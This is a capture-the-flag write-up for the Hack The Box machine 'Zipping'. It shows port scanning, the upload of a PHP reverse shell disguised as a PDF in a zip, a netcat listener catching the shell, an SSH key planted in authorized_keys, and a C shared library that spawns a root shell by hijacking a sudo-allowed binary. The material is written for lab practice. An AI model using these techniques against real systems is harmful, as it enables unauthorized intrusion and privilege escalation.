# medium - Zipping

## User Flag

Port scanning:
```bash
~z➤ sudo nmap -n -Pn -sV -O -T4 zipping.htb
[sudo] password for n0kt:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 18:09 -04
Nmap scan report for zipping.htb (10.10.11.229)
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
```

Found while reviewing html code:
- `/upload.php`
- Directory listing: http://zipping.htb/assets/
- Shop page: http://zipping.htb/shop/index.php?page=product&id=3


Uploading fake zip file:
```bash
z➤ touch hello.pdf
z➤ zip hello hello.pdf
  adding: hello.pdf (stored 0%)
```

{{< limg "/i/2023-08-31_18-21.png" "Uploaded fake file" >}}

Resultant file: http://zipping.htb/uploads/4556b8b1f54498aa1089ef6a2f83a537/hello.pdf

Need to create a PDF file with PHP content, the app only checks the file extension.

Uploading shell:
```bash
(venv) .../htb/p8/zipping➤ python pdf-php.py -L 10.10.14.7 -R zipping.htb
```

Uploaded revshell:
```bash
.../htb/p8/zipping➤ nc -lvnp 55555
Connection from 10.10.11.229:47104
bash: cannot set terminal process group (1118): Inappropriate ioctl for device
bash: no job control in this shell
rektsu@zipping:/var/www/html/uploads/ad8139726741e2f901979b3ff58fc3c7$ id
id
uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)
rektsu@zipping:/var/www/html/uploads/ad8139726741e2f901979b3ff58fc3c7$ ls
ls
rev.php
rektsu@zipping:/var/www/html/uploads/ad8139726741e2f901979b3ff58fc3c7$ ls /home
</uploads/ad8139726741e2f901979b3ff58fc3c7$ ls /home
rektsu
rektsu@zipping:/var/www/html/uploads/ad8139726741e2f901979b3ff58fc3c7$ ls /home/rektsu
<s/ad8139726741e2f901979b3ff58fc3c7$ ls /home/rektsu
linpeas.sh
user.txt
```

Getting a shell
```bash
.../htb/p8/zipping➤ ssh-keygen -t rsa -f sshkey

cat <<EOF >>/home/rektsu/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEcu2XZfnWel6hxRmouWly3EO3qATh0IE3zxVd6H+7gFURTLdcXROV8MXtS72Im0OoJ7nCqwWWLkqh5rs8skf3CMtfanLUe4ySTs7iVnoP3h4Vj5EMe3q4Px36KfMbsxqXM4EU/RPqxbx5LD0n2P9z0q+455pxBSX0uYU/kfL/gj4z364gDYHvEHUpf16YZVPs7QaFFjXbBeNUlyaZNUe7ZtbfSGK+VtfbUqLxJvOHGmC6fVjV4K1/zDuntfVwQW+t2jh0kIqlbEuLnv+wKaZmfZkp7OS+nzZ6PhVgqVXE5r21LTD13xxM5Ob20AZfPBE8iCPweAxrilXWdtg8M4rWp3NvbOMOAACgBUWVAGcGzZN8IbTHil1m8b+3h9f1COC6cnI3QGptcMSZDjEK7LUuo78NSD+YS/OQUK6LG8U5cvOxpEWcOX0bN0LND88K6nCYfUFL+hS1IdQYuhuQw3qSCLuDdgZVnMgAeLVC5u+TLO+KTpw/1A1zxc8kbgDrPns= n0kt@b0wer
EOF

chmod 600 /home/rektsu/.ssh/authorized_keys
```

```bash
rektsu@zipping:~$ id
uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)
```

## Root Flag

```bash
rektsu@zipping:~$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

```c
#include <stdlib.h>
#include <unistd.h>

void begin (void) __attribute__((destructor));

void begin (void) {
    system("bash -p");
}
```

```bash
rektsu@zipping:~$ gcc -shared -o /home/rektsu/.config/libcounter.so -fPIC e.c
```

```bash
root@zipping:/home/rektsu# strings /usr/bin/stock | grep -i st0ck
St0ckM4nager
 
rektsu@zipping:~$  sudo /usr/bin/stock
Enter the password: St0ckM4nager

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option: 3
root@zipping:/home/rektsu# id
uid=0(root) gid=0(root) groups=0(root)
```


## TODOs
- rev eng skills with strace/ltrace/strings
- pdf creation with php content and rev shell
- review zip format: https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html
